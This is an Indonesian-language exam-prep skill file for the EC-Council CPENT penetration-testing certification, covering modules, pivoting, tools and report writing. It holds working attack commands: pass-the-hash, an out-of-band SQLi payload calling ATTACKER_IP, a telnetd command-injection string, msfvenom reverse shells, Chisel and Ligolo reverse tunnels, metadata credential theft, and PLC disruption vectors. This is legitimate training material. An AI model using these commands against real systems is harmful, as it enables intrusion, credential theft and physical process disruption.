---
name: cpent
description: EC-Council CPENT (Certified Penetration Testing Professional) — mindset, metodologi, dan strategi komprehensif untuk CPENT exam mencakup 14 modul inti, binary exploitation 32/64-bit, IoT/OT/SCADA, double pivoting, report writing, dan LPT Master pathway.
license: MIT
compatibility: opencode
metadata:
  audience: penetration-testers
  workflow: exploitation
  source: ec-council-cpent
  standard: cpent
  year: "2026"
---

# CPENT — Metodologi & Pola Pikir

## Daftar Isi

1. [Overview & Exam Structure](#1-overview--exam-structure)
2. [CPENT Mindset](#2-cpent-mindset)
3. [Pentesting Methodology — 14 Modul Inti](#3-pentesting-methodology--14-modul-inti)
4. [Exam Zone Deep-Dives](#4-exam-zone-deep-dives)
5. [Tools Matrix](#5-tools-matrix)
6. [Report Writing](#6-report-writing)
7. [Referensi Lengkap](#7-referensi-lengkap)

---

## 1. Overview & Exam Structure

### Apa Itu CPENT?

EC-Council Certified Penetration Testing Professional (CPENT) adalah sertifikasi penetration testing 100% praktikal. Berbeda dengan CEH yang lebih teoritis, CPENT menguji kemampuan teknis langsung di network range selama 24 jam (2 sesi x 12 jam atau 1 sesi continuous).

### Perbedaan CPENT vs OSCP vs CEH

| Aspek | CPENT | OSCP+ | CEH (Practical) |
|-------|-------|-------|-----------------|
| **Durasi** | 24 jam (2x12) | 23h45m | 4-6 jam |
| **Bobot praktik** | 100% | 100% | 70% teori + 30% praktik |
| **Binary explt 64-bit** | Ya (32 & 64-bit) | Tidak (x86 only) | Tidak |
| **Double pivoting** | Ya | Single pivot | Tidak |
| **IoT/OT/SCADA** | Ya | Tidak | Tidak |
| **Report writing** | Dinilai (harus submit PDF 7 hari) | Dinilai (24 jam) | Tidak dinilai |
| **LPT Master** | 90%+ otomatis | Tidak ada | Tidak ada |
| **Open book** | Ya (semua sumber) | Ya | Tidak |
| **Machine revert** | Unlimited terbatas | Terbatas | N/A |
| **Web app** | Tidak dilarang otomatis | sqlmap dilarang | N/A |

### Scoring & Passing

| Komponen | Detail |
|----------|--------|
| **Total soals** | 5 (3 standalone + 2 complex) — bisa berubah per exam cycle |
| **CPENT passing** | 70% |
| **LPT Master** | 90%+ otomatis — tidak perlu ambil LPT terpisah |
| **Retake** | 1 free retake (dalam 4 minggu) |
| **Report deadline** | Maksimal 7 hari setelah exam selesai |
| **Report format** | PDF via EC-Council portal |

### Exam Format Options

| Format | Sesi | Durasi | Cocok Untuk |
|--------|------|--------|-------------|
| **Continuous (ASP)** | 1 sesi | 24 jam langsung | Yang sudah terbiasa marathon |
| **Split (ASP-S)** | 2 sesi | 2x12 jam (break 24-48 jam) | Yang butuh istirahat strategis |

### Exam Environment Rules

- **Allowed**: Burp Pro, Metasploit, sqlmap, automated tools — semua boleh
- **Open book**: Boleh Google, notes, buku, courseware — semua sumber
- **VPN**: EC-Council exam VPN — koneksi stabil adalah tanggung jawab peserta
- **Proctoring**: Live proctor via webcam + screen share
- **Restricted**: Tidak boleh ada orang lain di ruangan, no AI chatbots (dibatasi beberapa versi)

### Time Management (Split 2x12)

```
Day 1 (12 jam):
  00:00 - 01:00  — Enumeration parallel semua target
  01:00 - 04:00  — Attack standalone machines (2 targets)
  04:00 - 07:00  — Single pivot + privesc
  07:00 - 10:00  — Complex network entry
  10:00 - 11:00  — Dokumentasi & screenshots
  11:00 - 12:00  — Verify flags, backup notes, save semua output

Break 24-48 jam: review notes, riset teknik stuck

Day 2 (12 jam):
  00:00 - 01:00  — Re-enumeration semua target (ada yang berubah?)
  01:00 - 04:00  — Complete remaining standalones
  04:00 - 07:00  — Double pivot + deep network
  07:00 - 09:00  — IoT/Industrial/SCADA zone
  09:00 - 10:00  — Final exploitation (exploit yang pending)
  10:00 - 11:00  — Finalize documentation + bukti
  11:00 - 12:00  — Verify all screenshots, extract CVEs, siap-siap report
```

---

## 2. CPENT Mindset

### Filosofi Dasar CPENT

CPENT berbeda dari OSCP. OSCP mengajarkan "Try Harder" — enumeration sampai dapat satu entry point. CPENT mengajarkan **"Penetrate Deeper"** — setelah dapat satu machine, bagaimana masuk ke network yang lebih dalam, melewati firewall, pivoting multiple hops, dan mencapai target di subnet terisolasi.

### Golden Rules CPENT

1. **CPENT is a marathon, not a sprint** — 24 jam. Jaga energi, makan, minum, stretching.
2. **Pivoting is the core skill** — CPENT bukan tentang berapa banyak machine, tapi seberapa dalam Anda bisa menembus.
3. **Double pivot mindset** — setiap shell baru, cek interfaces. Selalu ada subnet lain di belakangnya.
4. **Document as if you're writing the report DURING the exam** — report adalah 30% dari nilai.
5. **Automation is allowed — use it** — sqlmap, Metasploit, Burp Pro — semua boleh. Gunakan untuk akselerasi.
6. **Binary exploitation 64-bit** — beda signifikan dari 32-bit. Pelajari calling convention x64.
7. **IoT & SCADA are different beasts** — industrial protocols behave differently. Web interface sering jadi entry point.
8. **Every flag is a data point** — buat spreadsheet dengan IP, hostname, user, root, flags yang didapat.

### Pattern Recognition untuk CPENT

CPENT menggunakan network range yang kompleks dengan pola yang bisa dikenali:

- **Web app frontend → SQLi → shell → pivoting → internal services**
- **IoT device → default creds → exposed debug interface → internal network access**
- **SCADA/PLC → Modbus enumeration → insecure protocol → control system access**
- **Windows AD → SMB enumeration → pass-the-hash → lateral movement → DC**
- **Linux → SUID abuse → root → SSH key → pivot to next segment**

---

## 3. Pentesting Methodology — 14 Modul Inti

CPENT memiliki 14 modul inti berdasarkan EC-Council official syllabus. Setiap modul merepresentasikan skill yang akan diuji di exam.

### Modul 1: Advanced Windows Attacks

Windows exploitation lebih dalam dari CEH:

**Enumeration Framework:**
```powershell
# Quick recon
net view /domain
nltest /dclist:$DOMAIN
nltest /domain_trusts

# Share scanning
net view \\$DC /all
sysinternals accesschk.exe /accepteula -uwcqv "Authenticated Users" *

# PowerShell enumeration
Get-Process | Where-Object { $_.SessionId -ne 0 }
Get-Service | Where-Object { $_.Status -eq "Running" }
Get-WmiObject -Class Win32_Share
```

**Attack Vectors:**
- **Pass-the-Hash (PtH)** dengan Impacket: `impacket-wmiexec DOMAIN/USER@TARGET -hashes LMHASH:NTHASH`
- **Overpass-the-Hash**: Konversi NTLM hash ke TGT Kerberos
- **DCSync**: Replikasi DC → dump semua hash via `impacket-secretsdump`
- **Kerberos attacks**: AS-REP Roasting, Kerberoasting, Silver/Golden Ticket
- **SMB relay**: ntlmrelayx.py → dapatkan shell ke target lain

**Mindset**: CPENT AD attacks tidak berbeda jauh dengan OSCP, tapi skalanya lebih besar — multiple domain, forest trust, cross-domain attacks.

### Modul 2: Advanced Linux Attacks

Linux exploitation lebih agresif — termasuk kernel exploitation dan custom service exploitation:

**Kernel Exploit Framework:**
```bash
# Automated kernel check
./linux-exploit-suggester.sh
./linux-smart-enumeration.sh

# Manual kernel version check
uname -a
cat /etc/os-release
dpkg -l | grep linux-image
```

**Key Attack Vectors:**
- **Dirty Pipe (CVE-2022-0847)** — overwrite read-only files, privesc via /etc/passwd
- **PwnKit (CVE-2021-4034)** — pkexec buffer overflow, instant root di banyak versi
- **Cron-based persistence**: writable crontab → reverse shell sebagai root
- **LD_PRELOAD abuse**: via sudo misconfiguration
- **SUID shell escape**: binary dengan SUID yang bisa spawn shell, via GTFOBins
- **Capabilities abuse**: `cap_setuid+ep`, `cap_dac_override`, `cap_sys_admin`

**Mindset**: Di CPENT, Linux privesc sering melibatkan exploit CVE yang sudah mature. Jangan takut menggunakan kernel exploit — CPENT environment biasanya stable dan revert tersedia.

### Modul 3: Web Application Exploitation

Tidak ada batasan tools otomatis. Strategi:

```bash
# Parallel scanning
sqlmap -u "$URL" --batch --random-agent --level 3 --risk 2
nikto -h $TARGET -ssl
ffuf -w $WORDLIST -u "$URL/FUZZ"

# Advanced SQLi via sqlmap
sqlmap -r request.txt -p parameter --batch --os-shell

# XSS to session hijacking
# CMDi to reverse shell
# LFI to RCE via log poisoning / PHP wrappers
# File upload bypass
```

**Mindset**: Di CPENT, web app adalah entry point yang paling umum. Prioritaskan web app scanning di 30 menit pertama.

### Modul 4: Advanced SQL Injection

SQL injection di CPENT lebih dalam dari SQLi dasar:

**Time-based blind exfiltration:**
```sql
'; IF (SELECT COUNT(*) FROM users WHERE is_admin=1) > 0 WAITFOR DELAY '0:0:5'--
```

**Out-of-band (OOB) SQLi:**
```sql
'; EXEC master..xp_dirtree '\\ATTACKER_IP\share\'--
```

**Second-order SQLi**: Inject di satu endpoint, trigger di endpoint lain.

**SQLi bypass techniques**:
- WAF bypass via HTTP parameter pollution (HPP)
- Unicode normalization bypass
- Case variation bypass
- Null byte injection

### Modul 5: Binary Exploitation — Windows x86 & x64

CPENT menguji BOF untuk arsitektur **32-bit dan 64-bit**:

#### x86 BOF Workflow

Sama dengan OSCP: fuzzing → offset → EIP control → bad chars → JMP ESP → shellcode.

#### x64 BOF Workflow — Perbedaan Kritis

x64 berbeda dari x86 dalam beberapa aspek:

```
1. Calling convention: x64 menggunakan __fastcall (RCX, RDX, R8, R9, stack)
   vs x86 stdcall/cdecl (parameter di stack, EIP di stack)

2. Address space: 64-bit address → tidak ada JMP ESP sederhana.
   Harus cari gadget di module tanpa ASLR/DEP.

3. POP ROP: x64 membutuhkan ROP chain untuk kontrol eksekusi.
   Pertama: POP ROP — pop register yang dikontrol lalu RET ke shellcode.

4. Register usage:
   x86: EAX, EBX, ECX, EDX, ESI, EDI, ESP, EBP, EIP
   x64: RAX, RBX, RCX, RDX, RSI, RDI, R8-R15, RSP, RBP, RIP

5. Shellcode: msfvenom -p windows/x64/shell_reverse_tcp
```

**x64 Practical Steps:**
1. **Fuzzing** — cari crash offset (sama seperti x86)
2. **Offset control** — pastikan RIP terkontrol
3. **Find module without ASLR/DEP** — `!mona modules` atau proses manual
4. **ROP gadget search** — `!mona rop -m module_name -cpb "\x00"`
5. **Stack pivot** — jika stack tidak executable, pivot heap + ROP + VirtualProtect
6. **Execute shellcode** — setelah VirtualProtect buat RWX, transfer kontrol

**Mindset**: x64 BOF adalah pembeda utama CPENT vs OSCP. Jika Anda bisa x64 BOF, Anda sudah unggul 50% di exam.

### Modul 6: Advanced Windows Privilege Escalation

**Token abuse supplement:**
- **SeImpersonatePrivilege**: PrintSpoofer, GodPotato, JuicyPotato, SweetPotato, EfsPotato
- **SeBackupPrivilege**: Backup SAM/SYSTEM hives, dump dari registry
- **SeRestorePrivilege**: Overwrite system files
- **SeDebugPrivilege**: Process injection ke SYSTEM process (e.g. lsass.exe)
- **SeTakeOwnershipPrivilege**: Ambil alih protected file/folder
- **SeLoadDriverPrivilege**: Load kernel driver → kernel exploit

**Service hardening bypass:**
- **Unquoted service path**: writable directory + space di path → executable planting
- **Weak service ACL**: `sc sdshow SERVICE_NAME` → cek permissions
- **Writable service binary**: overwrite binary di `C:\Program Files\...`
- **DLL hijacking**: service yang load DLL dari writable path

**Registry attacks:**
- **AlwaysInstallElevated**: MSI sebagai SYSTEM
- **AutoRun**: Startup persistence point
- **AppInit_DLLs**: DLL injection via registry

### Modul 7: IoT Exploitation

IoT devices di CPENT biasanya adalah embedded Linux devices dengan web interface:

**Enumeration Checklist:**
1. **Default credentials**: admin:admin, root:root, support:support — coba semua
2. **Web interface**: CMDi, LFI, directory traversal, authentication bypass
3. **Firmware analysis**: cari backdoor creds di firmware (jika bisa download)
4. **Debug interfaces**: Telnet enabled, debug port terbuka
5. **Exposed services**: MQTT (1883), CoAP (5683), custom protocols
6. **Command injection**: di ping/nslookup/traceroute parameters

**Common IoT Attack Vectors:**
- **Web shell via file upload**: upload PHP/ASP shell via firmware update
- **Command injection**: `; telnetd -l /bin/sh`
- **Hardcoded credentials**: strings binary → cari password
- **Busybox**: environment minimal — shell terbatas, gunakan static binaries
- **UART/JTAG**: jika ada akses fisik (tidak di exam, tapi perlu tahu)

**Mindset**: IoT devices di CPENT sering menjadi entry point ke network internal. Default credentials = shell. Shell di IoT = pivot point ke subnet lain.

### Modul 8: OT/SCADA Exploitation

Operational Technology dan SCADA systems:

**SCADA Protocols:**
- **Modbus TCP (502)**: Read/write coils dan registers
- **DNP3 (20000)**: Distributed Network Protocol — digunakan di electrical grid
- **BACnet (47808)**: Building automation
- **S7Comm (102)**: Siemens S7 PLC communication
- **EtherNet/IP (44818)**: Industrial Ethernet protocol

**Modbus Enumeration & Exploitation:**
```bash
# nmap NSE scripts
nmap -sV -p 502 --script modbus-discover $TARGET
nmap -sV -p 502 --script modbus-read $TARGET
nmap -sV -p 502 --script modbus-enum $TARGET

# Metasploit modules
use auxiliary/scanner/scada/modbus_findunitid
use auxiliary/scanner/scada/modbusdetect
use auxiliary/scanner/scada/siemens_s7_scanner
```

**Key Concepts:**
- **PLC**: Programmable Logic Controller — brain of industrial process
- **HMI**: Human-Machine Interface — dashboard operator
- **RTU**: Remote Terminal Unit — field device
- **ICS**: Industrial Control Systems — umbrella term

**Attack Vectors:**
- **Direct Modbus write**: ubah coil value → alter physical process
- **PLC stop/restart**: denial of service → process disruption
- **HMI compromise**: web interface → RCE → control system access
- **SCADA server attack**: Windows server running SCADA software → standard privesc

**Mindset**: OT/SCADA di CPENT adalah simulated environment. Protocol knowledge matters more than exploit complexity. Jika Anda tahu Modbus registers dan cara membacanya, Anda bisa menyelesaikan bagian ini.

### Modul 9: Pivoting & Double Pivoting

CPENT membedakan single pivot (seperti OSCP) dengan **double pivot**:

#### Single Pivot: Entry ke Network Pertama

```
Kali → Public facing server → Internal subnet 10.10.10.0/24
```

**Teknik:**
- **Chisel**: HTTP tunnel via SOCKS5
- **Ligolo-ng**: TUN-based tunnel (rekomendasi)
- **SSH dynamic**: `ssh -D 1080 user@pivot`
- **Socat**: simple port forwarding

#### Double Pivot: Dari Internal ke Deep Network

```
Kali → Pivot 1 (10.10.10.10) → Pivot 2 (172.16.1.10) → Target (192.168.1.10)
```

**Critical Path — Ligolo-ng:**
```bash
# Kali: Ligolo proxy
./proxy -selfcert -lhost 0.0.0.0 -lport 11601

# Pivot 1: Agent connect ke Kali
./agent -connect $KALI_IP:11601 -ignore-cert

# Di console Ligolo: add route untuk subnet Pivot 1
# Pivot 1 bisa akses 172.16.1.0/24
sudo ip route add 172.16.1.0/24 dev ligolo

# Deploy Ligolo agent dari Pivot 1 ke Pivot 2
# Upload binary via SCP/WinRM/SMB, execute agent
# Pivot 2: ./agent -connect $KALI_IP:11601 -ignore-cert
# (butuh reachability ke Kali — bisa via Pivot 1 tunneling)

# Di console: add route lagi untuk deep subnet
sudo ip route add 192.168.1.0/24 dev ligolo
```

**Alternative: Chisel for double pivot:**
```bash
# Kali: Chisel server
./chisel server -p 8000 --reverse --socks5

# Pivot 1: Chisel client
./chisel client $KALI_IP:8000 R:socks

# Pivot 1 juga jadi server untuk Pivot 2
./chisel server -p 8001 --reverse

# Pivot 2: Chisel client via Pivot 1
./chisel client $PIVOT1_IP:8001 R:1081:socks

# proxychains4.conf: tambahkan socks5 127.0.0.1 1081
# Traffic: Kali → proxychains → Pivot1:1081 → Pivot2 → target
```

**Pivoting Mindset:**
- **Every shell is a potential gateway** — cek interfaces setelah dapat shell
- **Upload statically compiled agents** — target tidak selalu punya Python/Go
- **Check firewall rules** — apakah outbound port tertentu diblok?
- **SSH keys are gold** — key-based auth memudahkan lateral movement
- **Dual-home hosts** — host dengan 2 interfaces adalah pivot alami

### Modul 10: Evasion Techniques

Melewati firewall, IDS, IPS, dan endpoint protection:

**Firewall Evasion:**
```bash
# Alternative ports
nc -lvp 443     # HTTPS port
nc -lvp 53      # DNS port
nc -lvp 8080    # HTTP proxy

# Encapsulation
# DNS tunneling: iodine, dnscat2
# HTTP/HTTPS tunneling: Chisel
# ICMP tunneling: ptunnel
```

**IDS/IPS Evasion:**
- **Payload encoding**: base64, hex, custom encryption
- **Fragmenting**: split payload across multiple packets
- **Whitespace obfuscation**: di web payloads
- **Case randomization**: di SQL queries
- **SSL/TLS**: encrypted channel melewati signature-based detection

**AV/EDR Evasion:**
- **Shellcode encryption**: XOR, AES sebelum encode di msfvenom
- **Process injection**: inject shellcode ke process legit
- **Living-off-the-land**: PowerShell, WMI, certutil untuk download
- **Custom shellcode runner**: compile dari C#, Nim, Rust

**Mindset**: Jangan anggap evasion sebagai skill terpisah — ini bagian integral dari exploitation. Jika default reverse shell terkena blok, ganti port, encode payload, atau ganti protocol.

### Modul 11: Shellcoding Basics

Memahami dan memodifikasi shellcode:

**msfvenom command reference:**
```bash
# Linux stageless
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f elf -o shell.elf

# Windows stageless (x64)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f exe -o shell.exe

# Windows staged (ukuran kecil)
msfvenom -p windows/x64/shell/reverse_tcp LHOST=$IP LPORT=$PORT -f exe -o shell_small.exe

# Encoded shellcode (avoid bad chars + evade)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=$PORT -e x64/xor -f c

# Custom bad chars
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=$PORT -b "\x00\x0a\x0d\xff" -f c
```

**Manual shellcode modification:**
- Ganti IP: cari bytes IP di shellcode, replace dengan target IP
- Ganti port: cari bytes port (big endian)
- Add decoder stub: XOR decoder sebelum shellcode

### Modul 12: Cryptography Attacks

Implementation weakness exploitation — bukan breaking crypto:

- **Weak hashes**: MD5, SHA1, LM hash — crack dengan hashcat
- **Default certificates**: self-signed certs, expired certs
- **Weak keys**: predictable SSH keys, default SSL keys
- **Padding oracle attack**: exploit CBC mode → decrypt data
- **Session hijacking**: predictable session tokens → replay attack
- **Known plaintext attack**: XOR key recovery

**Tools:**
- hashcat, John the Ripper
- SSLscan, testssl.sh
- PadBuster (padding oracle)
- Responder (NTLMv2 capture)

### Modul 13: Cloud Penetration Testing

Cloud service exploitation (AWS, Azure, GCP):

**AWS-Specific:**
- **S3 bucket enumeration**: `s3 ls s3://bucket-name` — misconfigured bucket = data leak
- **IAM privilege escalation**: misconfigured policies → escalate to admin
- **EC2 metadata service**: `http://169.254.169.254/latest/meta-data` → creds
- **Lambda injection**: Serverless function → RCE
- **Key leakage**: hardcoded AWS keys di config files, Git repos

**Azure-Specific:**
- **Managed identity abuse**: request token dari Instance Metadata Service
- **ADFS misconfiguration**: federation trust abuse
- **Key Vault enumeration**: misconfigured vault access
- **Azure Automation Account**: Runbook execution → RCE

**Mindset**: Cloud di CPENT biasanya terbatas pada S3 bucket enumeration, IAM misconfig, dan metadata service abuse.

### Modul 14: Penetration Testing Process & Report Writing

CPENT menguji **kemampuan dokumentasi** sebagai bagian integral dari pentest:

**Pre-engagement:**
- Scope definition
- Rules of engagement
- Timeline & deliverables
- Authorization documents

**Post-engagement:**
- Report writing dalam 7 hari
- Executive summary untuk manajemen
- Technical findings dengan CVSS scoring
- Remediation recommendations
- Proof of concept untuk setiap finding

---

## 4. Exam Zone Deep-Dives

### Zone 1: Standalone Machines

Mirip OSCP standalones — 2-3 machines, masing-masing perlu initial access + privesc.

**Strategi:**
- Parallel enumeration di 30 menit pertama
- Prioritaskan machine dengan port paling sedikit (usually easier)
- Jangan habiskan waktu >2 jam per machine — move on dan balik lagi

### Zone 2: Complex Network (Single Pivot)

Satu network dengan entry point (web app atau service exposed) → shell → pivot ke internal subnet.

**Key insight:**
- Entry point biasanya mudah (known vulnerability + public exploit)
- Internal subnet punya service yang tidak exposed ke internet
- Enumeration dari dalam adalah kunci

### Zone 3: Double Pivot

Dua lapis jaringan. Target ada di subnet yang hanya reachable setelah 2 hop.

**Mindset:**
- Pivot 1 adalah gateway ke subnet A
- Dari subnet A, cari host dual-home → Pivot 2 ke subnet B
- Target ada di subnet B

### Zone 4: IoT/Industrial

Satu atau lebih IoT devices + SCADA/PLC targets.

**Mindset:**
- IoT biasanya entry via web interface
- SCADA/PLC via protocol-specific exploitation
- Industrial protocols menggunakan port non-standard

### Zone 5: Exam Day Checklist

```
Pre-Exam (H-1):
  [ ] VPN client installed & tested
  [ ] Kali VM updated — `apt update && apt upgrade`
  [ ] Ligolo-ng, Chisel binaries ready (static compile)
  [ ] msfvenom payloads pre-generated (multiple ports)
  [ ] Wordlists: rockyou.txt, common.txt, directory-list-2.3-medium.txt
  [ ] Tools: Burp Suite, sqlmap, nmap, ffuf, netexec, impacket
  [ ] Note-taking setup: Obsidian/CherryTree with templates
  [ ] Screenshots folder structure: /home/kali/cpent/target1/ ...
  [ ] External monitor (recommended) — exam proctoring allows
  [ ] Power adapter, UPS (if laptop), stable internet (kabel > wifi)

Exam Day:
  [ ] Start VPN connection — verify tun0 interface
  [ ] Verify targets reachable — ping sweep
  [ ] Start parallel Nmap scans (all ports) on all targets
  [ ] Start web app scanning (Burp, ffuf, Nikto, sqlmap)
  [ ] Note: start time, expected end time
  [ ] Breaks scheduled every 3-4 hours (eat, drink, walk)

Post-Exam:
  [ ] All screenshots organized per target
  [ ] Flags listed: IP, hostname, local.txt, proof.txt, network screenshots
  [ ] Report drafted (template ready)
  [ ] Submit within 7 days deadline
  [ ] Upload ke EC-Council portal
```

---

## 5. Tools Matrix

### Essential Tools for CPENT

| Tool | Purpose | CPENT Priority |
|------|---------|----------------|
| **nmap** | Port scanning, service detection, NSE scripts | Critical |
| **Burp Suite (Pro)** | Web app proxy, scanner, repeater, intruder | Critical |
| **sqlmap** | Automated SQL injection | Critical |
| **Metasploit** | Exploitation framework (all modules allowed) | Critical |
| **Ligolo-ng** | TUN-based pivoting (recommended) | Critical |
| **Chisel** | HTTP tunnel pivoting (alternative) | Critical |
| **netexec (nxc)** | SMB/Wmi/WinRM/SSH enumeration & exploitation | Critical |
| **Impacket** | wmiexec, psexec, secretsdump, GetNPUsers, GetUserSPNs | Critical |
| **BloodHound** | AD attack path visualization | High |
| **Certipy** | AD CS enumeration & attack | High |
| **ffuf/feroxbuster** | Web directory fuzzing | High |
| **Responder** | NTLM relay & capture | High |
| **hashcat** | Password cracking (GPU) | High |
| **linux-exploit-suggester** | Linux kernel exploit suggestion | Medium |
| **WinPEAS/LinPEAS** | Privilege escalation enumeration | Medium |
| **GTFOBins/LOLBAS** | Binary abuse reference | Medium |
| **Nishang/Empire** | PowerShell post-exploitation | Medium |
| **Nikto** | Web server scanner | Medium |
| **Modbus tools (nmap, mbtget)** | SCADA/Modbus enumeration | Medium (zone-specific) |

### Static Binaries (Untuk Upload ke Target)

```
- nc (netcat static) — cross-platform
- ncat (Nmap static) — SSL support
- ligolo-ng agent — single binary
- chisel — single binary
- socat — port forwarding
- tcpdump — network capture
- busybox — embedded Linux Swiss army knife
- python3 static — jika target tidak punya Python
- curl/wget static — download tools ke target
```

### Wordlists

```bash
/usr/share/wordlists/rockyou.txt          # Password cracking
/usr/share/seclists/Discovery/Web-Content/common.txt         # Web directories
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  # Deep web
/usr/share/seclists/Usernames/Names/names.txt                # User enumeration
/usr/share/wordlists/metasploit/unix_users.txt              # Linux users
```

---

## 6. Report Writing

### Pentingnya Report

Report adalah **~30% dari nilai** CPENT. Anda bisa compromise semua machine tapi jika report tidak lengkap, nilai bisa berkurang drastis. Report juga yang membedakan CPENT dari LPT pathway.

### Report Structure (EC-Council Format)

1. **Cover Page**: Exam ID, name, date
2. **Non-Disclosure Agreement**
3. **Executive Summary** (1 page):
   - Scope of work
   - Overall security posture
   - High-level findings summary
   - Risk rating overview
4. **Methodology** (1-2 pages):
   - Approach overview
   - Tools used
   - Phases of testing
5. **Network Diagram**:
   - Topology discovered
   - Paths taken (attack chain visual)
   - Pivoting diagram
6. **Detailed Findings** (per target):
   - **Target IP**: hostname, OS
   - **Services discovered**: port, service, version
   - **Vulnerabilities identified**: CVE, CVSS score, description
   - **Exploitation steps**: step-by-step with screenshots
   - **Proof**: local.txt, proof.txt screenshots
   - **Remediation**: specific fix recommendation
7. **Appendices**:
   - Full scan outputs
   - Custom scripts/code
   - Password lists discovered
   - All flags table

### Screenshot Requirements

EC-Council sangat ketat tentang bukti screenshot:

- **Shell access**: `whoami`, `id`, `hostname`, `ipconfig`/`ip addr` — semua di satu screenshot
- **Proof files**: `type local.txt` / `cat proof.txt` di terminal
- **Network path**: ifconfig/ipconfig sebelum dan sesudah pivoting
- **Exploit execution**: command yang jalan, output yang diterima
- **Timestamps**: screenshot harus menunjukkan konteks waktu (jam exam)

### Report Template

Gunakan template yang sudah teruji:

```
CPENT-Exam-Report-YYYYMMDD/
├── report.pdf
├── appendices/
│   ├── scan-results/
│   ├── exploit-code/
│   ├── screenshots/
│   └── password-lists/
└── flags-summary.ods (spreadsheet)
```

### Executive Summary Template (150-300 words)

```
During the CPENT practical assessment conducted on [DATE], a thorough penetration test
was performed against the target network range comprising [N] systems including web servers,
database servers, IoT devices, and industrial control systems. The assessment simulated a
real-world attack scenario requiring initial compromise, lateral movement, pivoting through
multiple network segments, and privilege escalation to domain/enterprise administrator level.

[Report asli tidak boleh berisi template kaku — gunakan format naratif profesional:
- What was tested
- How critical findings impact confidentiality, integrity, availability
- Overall risk level
- High-level recommendation summary]
```

### Report Quality Checklist

- [ ] Executive summary jelas dan ringkas
- [ ] Network diagram lengkap dengan attack path
- [ ] Setiap finding memiliki CVSS score
- [ ] Setiap langkah exploitation reproducible
- [ ] Screenshots menunjukkan IP + hostname + flag
- [ ] Remediation actionable (bukan "patch your system")
- [ ] All appendices included
- [ ] PDF generasi final — test open di reader
- [ ] Submit sebelum deadline 7 hari

---

## 7. Referensi Lengkap

### Official Resources

| # | Resource | URL |
|---|----------|-----|
| 1 | EC-Council CPENT Official Page | https://www.eccouncil.org/train-certify/certified-penetration-testing-professional-cpent/ |
| 2 | EC-Council CPENT Exam Blueprint | https://www.eccouncil.org/cpent-exam-blueprint/ |
| 3 | EC-Council ANSI Certification Page | https://www.eccouncil.org/ansi/ |
| 4 | EC-Council CPENT/LPT Master FAQ | https://www.eccouncil.org/train-certify/faqs/ |
| 5 | EC-Council Exam Portal (Aspen) | https://aspen.eccouncil.org/ |
| 6 | EC-Council CPENT Candidate Handbook | https://cert.eccouncil.org/cpent-candidate-handbook/ |

### Course & Training

| # | Resource | URL |
|---|----------|-----|
| 7 | EC-Council CPENT Course | https://www.eccouncil.org/train-certify/certified-penetration-testing-professional-cpent/ |
| 8 | EC-Council CEH Master → CPENT | https://www.eccouncil.org/train-certify/certified-penetration-testing-professional-cpent/ |
| 9 | Mediagraphix — CPENT Course | https://www.mediagraphix.de/en/courses/ec-council-cpent |
| 10 | NetCom Learning — CPENT | https://www.netcomlearning.com/certification/cpent-certification-training.html |
| 11 | Koenig Solutions — CPENT | https://www.koenig-solutions.com/cpent-training |
| 12 | InfosecTrain — CPENT Training | https://www.infosectrain.com/courses/ec-council-cpent-certification-training/ |
| 13 | QuickStart — CPENT | https://www.quickstart.com/ec-council/cybersecurity/certified-penetration-testing-professional-cpent-training.html |
| 14 | TIC Learning — CPENT | https://www.tictraining.ca/ec-council-training/cpent |
| 15 | Simplilearn — CPENT | https://www.simplilearn.com/ec-council-cpent-certification-training-course |
| 16 | iCollege — CPENT | https://www.icollege.co/courses/ec-council/cpent |
| 17 | QuickStart — CPENT Cost | https://www.quickstart.com/ec-council/cybersecurity/cpent-certification-cost.html |

### Comparison Articles

| # | Resource | URL |
|---|----------|-----|
| 18 | InfoSec4TC — CPENT vs OSCP vs CEH | https://www.infosec4tc.com/cpent-vs-oscp-vs-ceh/ |
| 19 | Simplilearn — CPENT vs OSCP | https://www.simplilearn.com/cpent-vs-oscp-article |
| 20 | Cyber Security News — OSCP vs CEH vs CPENT | https://cybersecuritynews.com/oscp-vs-ceh-vs-cpent/ |
| 21 | Medium — CEH vs OSCP vs CPENT | https://medium.com/@nishu042/ceh-vs-oscp-vs-cpent-which-ethical-hacking-certification-is-best-in-2026-e69abe082fe9 |
| 22 | The CyberSec — OSCP vs CEH vs CPENT | https://thecybersec.com/oscp-vs-ceh-vs-cpent/ |
| 23 | Techworm — CEH vs CPENT vs OSCP | https://techworm.net/programming/ethical-hacking/ceh-vs-cpent-vs-oscp/ |
| 24 | Security Analyst — CPENT vs OSCP | https://securityanalyst.co/cpent-certification-vs-oscp/ |

### Exam Reviews & Experience

| # | Resource | URL |
|---|----------|-----|
| 25 | Medium — CPENT Review 2024 | https://medium.com/@al-ameen/the-ec-council-cpent-certification-a-comprehensive-guide-review-4115ef9f47b8 |
| 26 | Reddit — CPENT Experience | https://www.reddit.com/r/CEH/comments/pn4k3s/ec_council_cpent_exam_experience/ |
| 27 | Linkedin — LPT Master & CPENT | https://www.linkedin.com/pulse/earn-lpt-master-simply-cpent-farhad-hossain/ |
| 28 | Stanislas — CPENT Tips | https://stanislas.io/2023/01/20/some-advices-about-the-ec-council-cpent-exam/ |
| 29 | IT Security Zone — CPENT Review | https://itsecurityzone.com/2023/01/17/ec-council-cpent-review/ |
| 30 | Netcom Learning — CPENT Exam Tips | https://www.netcomlearning.com/blogs/185/cpent-exam-tips.html |
| 31 | InfosecTrain — CPENT Tips | https://www.infosectrain.com/blog/ec-council-cpent-exam-guide-and-tips/ |

### YouTube Walkthroughs & Playlists

| # | Channel/Video | Focus |
|---|---------------|-------|
| 32 | InfosecPat — CPENT Full Course | https://www.youtube.com/watch?v=L_uLv3W6_3g |
| 33 | Mossé Cybersecurity — OT Security | OT/SCADA security fundamentals |
| 34 | SANS ICS Security | ICS/SCADA security resources |
| 35 | IppSec — HTB Walkthroughs | General pentest methodology |
| 36 | John Hammond — CPENT Prep | Binary exploitation, CTF methodology |

### Pivoting & Tunneling

| # | Resource | URL |
|---|----------|-----|
| 37 | NordbySec — Ligolo-NG Tutorial | https://nordbysec.com/2025/04/13/pivoting-through-the-network-the-power-of-ligolo-ng/ |
| 38 | Asif Nawaz — Chisel & Ligolo-ng | https://www.asifnawazminhas.com/posts/pivoting-port-forwarding/ |
